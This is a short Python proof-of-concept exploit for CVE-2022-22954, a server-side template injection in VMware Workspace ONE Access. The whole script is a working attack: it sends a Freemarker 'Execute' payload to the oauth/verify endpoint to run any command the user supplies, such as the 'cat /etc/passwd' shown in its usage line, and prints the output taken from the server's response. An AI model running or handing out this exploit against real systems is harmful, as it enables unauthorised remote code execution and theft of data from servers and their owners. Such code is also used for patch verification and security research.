"""
CVE-2022-22954 PoC - VMware Workspace ONE Access Freemarker Server-Side Template Injection

[-] Github: 
https://github.com/DrorDvash/CVE-2022-22954_VMware_PoC

[-] Usage: 
python3 CVE-2022-22954.py example.com "cat /etc/passwd"
"""

import sys
import requests

usage = '#Usage: python3 {} example.com "cat /etc/passwd"\n'.format(sys.argv[0])

if ("-h" in sys.argv[1]) or (len(sys.argv) < 1):
	print("\n" + usage)
	exit()


def execute():
	try:
		base_url = "https://{}/catalog-portal/ui/oauth/verify?error=&deviceUdid=".format(sys.argv[1])
		payload = "${{\"freemarker.template.utility.Execute\"?new()(\"{}\")}}".format(sys.argv[2])
		final_url = base_url + url_encode_all(payload)

		r = requests.get(final_url)
		from_output = r.text.find(': workspace, device id:')
		to_output = r.text.find(', device type:')

		if from_output != -1:
			print("#PoC URL:", final_url, "\n")
			print("Output:\n----------")
			output = r.text[from_output+24:to_output]
			for line in output.split('\\n'):
				print(line)
		else:
			print("[!] ERROR: Target is not vulnerable.")
	except:
		print('ERROR!\n{}'.format(usage))
		exit()


def url_encode_all(string):
	return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)


execute()
